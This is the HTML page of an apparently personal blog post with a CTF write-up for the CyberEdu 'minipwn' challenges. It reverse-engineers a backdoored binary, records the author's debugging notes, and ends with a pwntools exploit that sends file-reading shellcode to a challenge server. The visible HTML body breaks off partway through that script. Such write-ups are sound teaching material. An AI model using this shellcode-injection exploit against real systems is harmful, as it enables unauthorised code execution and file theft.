@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CyberEdu minipwn &amp; minipwn2 Writeup | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="CyberEdu, pwn">
+<meta name="description" content="Challenge overview
+Desi pare o aplicatie simpla suspectam ca autorul a introdus un backdoor. Trebuie sa aflam daca acesta exista si daca il putem exploata pentru a obtine acces la steag (/flag.txt).
+
+minipwn is just like minipwn2 except they left /flag.txt as readable to anyone. So you can just go to /flag.txt and read it. But not in the second one.
+
+We do get a web instance this time:
+">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/minipwn-writeup/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.0104eb9d8f72dfc23e72924f1f282ad928b9467519160af39d6ea2ca5ea692a4.css" integrity="sha256-AQTrnY9y38I&#43;cpJPHygq2Si5RnUZFgrznW6iyl6mkqQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/minipwn-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/minipwn-writeup/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="CyberEdu minipwn & minipwn2 Writeup">
+  <meta property="og:description" content="Challenge overview Desi pare o aplicatie simpla suspectam ca autorul a introdus un backdoor. Trebuie sa aflam daca acesta exista si daca il putem exploata pentru a obtine acces la steag (/flag.txt).
+minipwn is just like minipwn2 except they left /flag.txt as readable to anyone. So you can just go to /flag.txt and read it. But not in the second one.
+We do get a web instance this time:">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-05-02T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-05-02T00:00:00+00:00">
+    <meta property="article:tag" content="CyberEdu">
+    <meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CyberEdu minipwn &amp; minipwn2 Writeup">
+<meta name="twitter:description" content="Challenge overview
+Desi pare o aplicatie simpla suspectam ca autorul a introdus un backdoor. Trebuie sa aflam daca acesta exista si daca il putem exploata pentru a obtine acces la steag (/flag.txt).
+
+minipwn is just like minipwn2 except they left /flag.txt as readable to anyone. So you can just go to /flag.txt and read it. But not in the second one.
+
+We do get a web instance this time:
+">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CyberEdu minipwn \u0026 minipwn2 Writeup",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/minipwn-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CyberEdu minipwn \u0026 minipwn2 Writeup",
+  "name": "CyberEdu minipwn \u0026 minipwn2 Writeup",
+  "description": "Challenge overview Desi pare o aplicatie simpla suspectam ca autorul a introdus un backdoor. Trebuie sa aflam daca acesta exista si daca il putem exploata pentru a obtine acces la steag (/flag.txt).\nminipwn is just like minipwn2 except they left /flag.txt as readable to anyone. So you can just go to /flag.txt and read it. But not in the second one.\nWe do get a web instance this time:\n",
+  "keywords": [
+    "CyberEdu", "pwn"
+  ],
+  "articleBody": "Challenge overview Desi pare o aplicatie simpla suspectam ca autorul a introdus un backdoor. Trebuie sa aflam daca acesta exista si daca il putem exploata pentru a obtine acces la steag (/flag.txt).\nminipwn is just like minipwn2 except they left /flag.txt as readable to anyone. So you can just go to /flag.txt and read it. But not in the second one.\nWe do get a web instance this time:\nIdentifying the vulnerabilities In the binary, there are a couple interesting things happening.\nThe __ctype_b_loc() function is being used, more about that I found here.\nunsigned __int64 __fastcall sub_11B9(const char *a1, char **a2) { while ( ((*__ctype_b_loc())[*a1] \u0026 0x2000) != 0 ) ++a1; return strtoul(a1, a2, 16); //unsigned hexa } So the bits in our number are - and get ready - 0000 - alphanumeric - punctuation - control character - … - lowercase - uppercase. But, this is being checked against \u0026 0x2000 or, in bits, \u0026 0010000000000000. But, the function’s first 4 bits will always be 0. Any bit \u0026 0 is 0, so the only chance of this being different to null is that third bit in our function result being 1 as well.\nSo, it’s always going to be 0. Genuinely. That means it just returns str to unsigned long of our parameter. That felt weird, but I found this other article confirming it. So, it really does only go up to the twelvth byte.\nEssentially, this function coverts s with strtoul and puts it into s’s address.\nunsigned __int64 __fastcall im_strtoul(const char *s, char **s_addr) { while ( ((*__ctype_b_loc())[*s] \u0026 0x2000) != 0 ) ++s; return strtoul(s, s_addr, 16); } Then we have this other function getting called by main:\n.... v22 = 0; v23 = 0; v24 = 0; v25 = 0; v26 = 0; v27 = 0; if ( a2 \u003c= 190 ) { snprintf(s, a2 + 7, \"Salut %s\", a1); return printf(s); } return result; } snprintf just does printf of a2+7 bytes, of Salut a1 into s.\nSo we somehow need to control the parameters in main. We can input something when running the binary, which is then moved into a1, and it looks like it represents the number of parameters + 1.\nstart 2 2 2 2 29 -\u003e rdi = 0x6.\nstart 2 2 2 2 29 989898 1313 001 -\u003e rdi = 0x9.\nThis just checks that we only input one parameter. And even though they’re referring to it as a2 in the decompilation, rdi is the one getting checked against ‘12 34’, and it’s the one getting its length checked.\nSo, we need our input to be ‘12 34’ but using spaces skips this check altogether. And the web suggest that we input hex, without the 0x part, as a parameter.\nThe backdoor would take the result of this function, move it in dest, and execute it as instructions.\n_BYTE *__fastcall sub_1212(char *our_param, _DWORD *a2) { size_t len; // rax char v3; // al char *s; // [rsp+8h] [rbp-18h] BYREF _BYTE *mallocation; // [rsp+10h] [rbp-10h] _BYTE *v7; // [rsp+18h] [rbp-8h] s = our_param; len = strlen(our_param); mallocation = malloc((len + 1) / 3); v7 = mallocation; while ( *s ) { v3 = im_strtoul(s, \u0026s); *v7++ = v3; } *a2 = (_DWORD)v7 - (_DWORD)mallocation; return mallocation; } This is the function returning what’s getting executed. To me, at least now, it looks like its malloc-ing our parameter (more specifically, the first third), turning it into a ul, character by character, and returning that. But to confirm we should get there with our debugger.\nWell, that’s a bummer, that’s just the first (well, last) character. And if we made our parameter too long, it would just set itself to ‘0xff’. Writing 41414141414141 for example, just returned ‘Salut A’.\nSending '\"12 34\"' did consider it as just one string instead of two. But it didn’t pass the check.\nI even tried a backslash escape for the space but they escaped by escape like '12\\\\ 34'.\nI think I fucking did it with unicode escapes… I sent r '12 344' … “\\u200D” zero width joiner… At this point after the unicode escape being necessary I’m thinking this is an extraordinarily elaborate challenge;\nSince after any hex number I would input, it took ONLY the last byte and executed it. So how am I supposed to get it to execute cat /flag.txt in one byte? I thought, either get the hex strtoul function to return more than one character, or somehow become the binary exploitation master who can jmp back to the rest of our input with only a single byte. These were my notes from this dark period of my life. Feel free to skip over this.\n“Notes” we can make it call jmp += until the rest of our bytes !\nis jmp +=x one byte? (note from future - nope)\njmp to r9 ; in r9 is out exact bytes : 0x4300313431343134\nproblem; we have a singel byte and most instructions are 2 bytes long.. can we get this functiin to return 2 bytes, or do we make our explot one byte..\ni changed the byte to \\xeb (aka jump ) and its trying to jump 2 bytes.. bad..\nbut why tf is it rying jump to 0x7fffffffd972 (2 bytes!)\ne9 tried to jump 5 bytes. but we want it to jmp 0x60f. :/\nwait… inside s, strtoul is put… waht if we make it a valid address? so that it loops again? like 0xffffffffff and so on but v3 is a char\nthe point is we want this while to happen twice. for two bytes of shellcode. lets test.\nr '12 34498765432125f'\nnu o fucking gunctionat.. tot returneaza un singur gunoi chiar am incercat puii mei singura solutie ar fi sa facem cumva sa scriem doi bytes in fctia pulii\nal \u0026 al ; prima data e 0x35 \u00260x35 adica primii bytes din inputul nostru\nhere .. trying to see how to get this fucker to run tiwece\nits taking one byte from 0x4746524f4c4f4300 exactly the null byte (lol) and putting that into eax turning al null\nwtf is that string its COLORFGBG=15;0 lol\nso first time taking the last byte from our string ,next time taking it from the fucking bg color?\nok new plan - just fill the stack with crap maybe its gonna overwrite the bg color variable\nbut our input grows the other way. so wtf? env variables decide whether our input hapes on not? nice!!!\nThe exploit This was driving me absolutely CRAZY so I asked a friend about how he solved it, and, turns out he hadn’t finished it either. So we made the exploit together.\nThe way I was passing the parameter inside the debugger was breaking it, and pwntools had a tool for this. Apparently, I didn’t even have to unicode escape the space. It was just pwndbg messing with it.\nAnd, as the 12 34 was indicating, the hex needed to be separated into bytes with spaces. I mean like 41 41 41. That must’ve been why it was only taking my last byte in consideration for execution. Now it seems so obvious but it really wasn’t at the time.\nSo here is my exploit:\nfrom pwn import * import requests url = \"http://35.246.235.205:31454/index.php\" elf = ELF('/home/kali/Downloads/minipwn') #p=elf.process() context.arch = 'amd64' ip, port = cyberedu.split(':') port = int(port) stringy = '' shellcat = asm(shellcraft.cat('/flag.txt')) stringy = shellcat.hex(' ') payload = '12 34 ' + stringy print(payload) print(len(payload)) data = { 'pwn': (payload), 'submit': \"Pwn\" } res = requests.post(url, data=data) print(res.text) p = elf.process(argv=[payload]) p.interactive() This was the worst challenge I’ve solved these days by far.\nAs always, the full code can be found on my GitHub here.\n",
+  "wordCount" : "1288",
+  "inLanguage": "en",
+  "datePublished": "2026-05-02T00:00:00Z",
+  "dateModified": "2026-05-02T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/minipwn-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">
+                <img src="/writeup-blog/images/sakura.png" alt="" aria-label="logo"
+                     style="vertical-align:middle; margin-right:8px; display:inline-block;">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      CyberEdu minipwn &amp; minipwn2 Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-05-02 00:00:00 +0000 UTC'>May 2, 2026</span>&nbsp;·&nbsp;<span>7 min</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
+                <li>
+                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a></li>
+                <li>
+                    <a href="#notes" aria-label="&ldquo;Notes&rdquo;">&ldquo;Notes&rdquo;</a></li>
+                <li>
+                    <a href="#the-exploit" aria-label="The exploit">The exploit</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
+<p>Desi pare o aplicatie simpla suspectam ca autorul a introdus un backdoor. Trebuie sa aflam daca acesta exista si daca il putem exploata pentru a obtine acces la steag (/flag.txt).</p>
+<hr>
+<p>minipwn is just like minipwn2 except they left /flag.txt as readable to anyone. So you can just go to /flag.txt and read it. But not in the second one.</p>
+<hr>
+<p>We do get a web instance this time:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/minipwn-writeup/web.png#center"></p>
+<h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
+<p>In the binary, there are a couple interesting things happening.</p>
+<p>The <code>__ctype_b_loc()</code> function is being used, more about that I found <a href="https://stackoverflow.com/questions/37702434/ctype-b-loc-what-is-its-purpose">here</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">sub_11B9</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>a1, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a2)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( ((<span style="color:#f92672">*</span><span style="color:#a6e22e">__ctype_b_loc</span>())[<span style="color:#f92672">*</span>a1] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x2000</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">++</span>a1;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strtoul</span>(a1, a2, <span style="color:#ae81ff">16</span>); <span style="color:#75715e">//unsigned hexa
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/minipwn-writeup/elab.png#center"></p>
+<p>So the bits in our number are - and get ready - 0000 - alphanumeric - punctuation - control character - &hellip; - lowercase - uppercase. But, this is being checked against <code>&amp; 0x2000</code> or, in bits, <code>&amp; 0010000000000000</code>. But, the function&rsquo;s first 4 bits will always be 0. Any bit <code>&amp; 0</code> is 0, so the only chance of this being different to null is that third bit in our function result being 1 as well.</p>
+<p>So, it&rsquo;s always going to be 0. Genuinely. That means it just returns str to unsigned long of our parameter. That felt weird, but I found this other <a href="https://braincoke.fr/blog/2018/05/what-is-ctype-b-loc/#about-__ctype_b_loc">article</a> confirming it. So, it really does only go up to the twelvth byte.</p>
+<p>Essentially, this function coverts <code>s</code> with <code>strtoul</code> and puts it into <code>s</code>&rsquo;s address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">im_strtoul</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>s_addr)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( ((<span style="color:#f92672">*</span><span style="color:#a6e22e">__ctype_b_loc</span>())[<span style="color:#f92672">*</span>s] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x2000</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">++</span>s;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strtoul</span>(s, s_addr, <span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Then we have this other function getting called by main:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span> v22 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  v23 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  v24 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  v25 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  v26 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  v27 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( a2 <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">190</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(s, a2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>, <span style="color:#e6db74">&#34;Salut %s&#34;</span>, a1);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">printf</span>(s);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>snprintf</code> just does <code>printf</code> of <code>a2+7</code> bytes, of <code>Salut a1</code> into <code>s</code>.</p>
+<p>So we somehow need to control the parameters in main. We can input something when running the binary, which is then moved into <code>a1</code>, and it looks like it represents the number of parameters + 1.</p>
+<p><code>start 2 2 2 2 29</code> -&gt; rdi = 0x6.</p>
+<p><code>start 2 2 2 2 29 989898 1313 001</code> -&gt; rdi = 0x9.</p>
+<p>This just checks that we only input one parameter. And even though they&rsquo;re referring to it as a2 in the decompilation, <code>rdi</code> is the one getting checked against &lsquo;12 34&rsquo;, and it&rsquo;s the one getting its length checked.</p>
+<p>So, we need our input to be &lsquo;12 34&rsquo; but using spaces skips this check altogether. And the web suggest that we input hex, without the 0x part, as a parameter.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/minipwn-writeup/cump.png#center"></p>
+<p>The <em>backdoor</em> would take the result of this function, move it in dest, and execute it as instructions.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>_BYTE <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">sub_1212</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>our_param, _DWORD <span style="color:#f92672">*</span>a2)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> len; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v3; <span style="color:#75715e">// al
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s; <span style="color:#75715e">// [rsp+8h] [rbp-18h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _BYTE <span style="color:#f92672">*</span>mallocation; <span style="color:#75715e">// [rsp+10h] [rbp-10h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _BYTE <span style="color:#f92672">*</span>v7; <span style="color:#75715e">// [rsp+18h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  s <span style="color:#f92672">=</span> our_param;
+</span></span><span style="display:flex;"><span>  len <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(our_param);
+</span></span><span style="display:flex;"><span>  mallocation <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>((len <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">/</span> <span style="color:#ae81ff">3</span>);
+</span></span><span style="display:flex;"><span>  v7 <span style="color:#f92672">=</span> mallocation;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#f92672">*</span>s )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">im_strtoul</span>(s, <span style="color:#f92672">&amp;</span>s);
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>v7<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> v3;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>a2 <span style="color:#f92672">=</span> (_DWORD)v7 <span style="color:#f92672">-</span> (_DWORD)mallocation;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> mallocation;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This is the function returning what&rsquo;s getting executed. To me, at least now, it looks like its malloc-ing our parameter (more specifically, the first third), turning it into a ul, character by character, and returning that. But to confirm we should get there with our debugger.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/minipwn-writeup/bum.png#center"></p>
+<p>Well, that&rsquo;s a bummer, that&rsquo;s just the first (well, last) character. And if we made our parameter too long, it would just set itself to &lsquo;0xff&rsquo;. Writing <code>41414141414141</code> for example, just returned &lsquo;Salut A&rsquo;.</p>
+<p>Sending <code>'&quot;12 34&quot;'</code> did consider it as just one string instead of two. But it didn&rsquo;t pass the check.</p>
+<p>I even tried a backslash escape for the space but they escaped by escape like <code>'12\\ 34'</code>.</p>
+<p>I think I fucking did it with unicode escapes&hellip; I sent <code>r '12 344'</code> &hellip; &ldquo;\u200D&rdquo; zero width joiner&hellip; At this point after the unicode escape being necessary I&rsquo;m thinking this is an extraordinarily elaborate challenge;</p>
+<p>Since after any hex number I would input, it took ONLY the last byte and executed it. So how am I supposed to get it to execute <code>cat /flag.txt</code> in one byte? I thought, either get the hex <code>strtoul</code> function to return more than one character, or somehow become the binary exploitation master who can jmp back to the rest of our input with only a single byte. These were my notes from this dark period of my life. Feel free to <a href="https://irinasusca.github.io/writeup-blog/posts/minipwn-writeup/#the-exploit">skip over this</a>.</p>
+<h2 id="notes">&ldquo;Notes&rdquo;<a hidden class="anchor" aria-hidden="true" href="#notes">#</a></h2>
+<blockquote>
+<p>we can make it call jmp += until the rest of our bytes !</p></blockquote>
+<blockquote>
+<p>is jmp +=x one byte? (note from future - nope)</p></blockquote>
+<blockquote>
+<p>jmp to r9 ; in r9 is out exact bytes : 0x4300313431343134</p></blockquote>
+<blockquote>
+<p>problem; we have a singel byte and most instructions are 2 bytes long.. can we get this functiin to return 2 bytes, or do we make our explot one byte..</p></blockquote>
+<blockquote>
+<p>i changed the byte to <code>\xeb</code> (aka jump ) and its trying to jump 2 bytes.. bad..</p></blockquote>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/minipwn-writeup/jump.png#center"></p>
+<blockquote>
+<p>but why tf is it rying jump to 0x7fffffffd972 (2 bytes!)</p></blockquote>
+<blockquote>
+<p>e9 tried to jump 5 bytes.
+but we want it to jmp 0x60f. :/</p></blockquote>
+<blockquote>
+<p>wait&hellip; inside s, strtoul is put&hellip; waht if we make it a valid address?
+so that it loops again?
+like 0xffffffffff and so on
+but v3 is a char</p></blockquote>
+<blockquote>
+<p>the point is we want this while to happen twice. for two bytes of shellcode.
+lets test.</p></blockquote>
+<p><code>r '12 34498765432125f'</code></p>
+<blockquote>
+<p>nu o fucking gunctionat.. tot returneaza un singur gunoi
+chiar am incercat puii mei singura solutie ar fi sa facem cumva sa scriem doi bytes in fctia pulii</p></blockquote>
+<blockquote>
+<p><code>al &amp; al</code> ; prima data e 0x35 &amp;0x35 adica primii bytes din inputul nostru</p></blockquote>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/minipwn-writeup/zfkc.png#center"></p>
+<blockquote>
+<p>here .. trying to see how to get this fucker to run tiwece</p></blockquote>
+<blockquote>
+<p>its taking one byte from <code>0x4746524f4c4f4300</code> exactly the null byte (lol) and putting that into <code>eax</code> turning <code>al</code> null</p></blockquote>
+<blockquote>
+<p>wtf is that string its <code>COLORFGBG=15;0</code>  lol</p></blockquote>
+<blockquote>
+<p>so first time taking the last byte from our string ,next time taking it from the fucking <em>bg color</em>?</p></blockquote>
+<blockquote>
+<p>ok new plan - just fill the stack with crap maybe its gonna overwrite the bg color variable</p></blockquote>
+<blockquote>
+<p>but our input grows the other way. so wtf? env variables decide whether our input hapes on not? nice!!!</p></blockquote>
+<h2 id="the-exploit">The exploit<a hidden class="anchor" aria-hidden="true" href="#the-exploit">#</a></h2>
+<p>This was driving me absolutely CRAZY so I asked a friend about how he solved it, and, turns out he hadn&rsquo;t finished it either. So we made the exploit together.</p>
+<p>The way I was passing the parameter inside the debugger was breaking it, and pwntools had a tool for this. Apparently, I didn&rsquo;t even have to unicode escape the space. It was just <code>pwndbg</code> messing with it.</p>
+<p>And, as the <code>12 34</code> was indicating, the hex needed to be separated into bytes with spaces. I mean like <code>41 41 41</code>. That must&rsquo;ve been why it was only taking my last byte in consideration for execution. Now it seems so obvious but it really wasn&rsquo;t at the time.</p>
+<p>So here is my exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://35.246.235.205:31454/index.php&#34;</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/home/kali/Downloads/minipwn&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#p=elf.process()</span>
+</span></span><span style="display:flex;"><span>
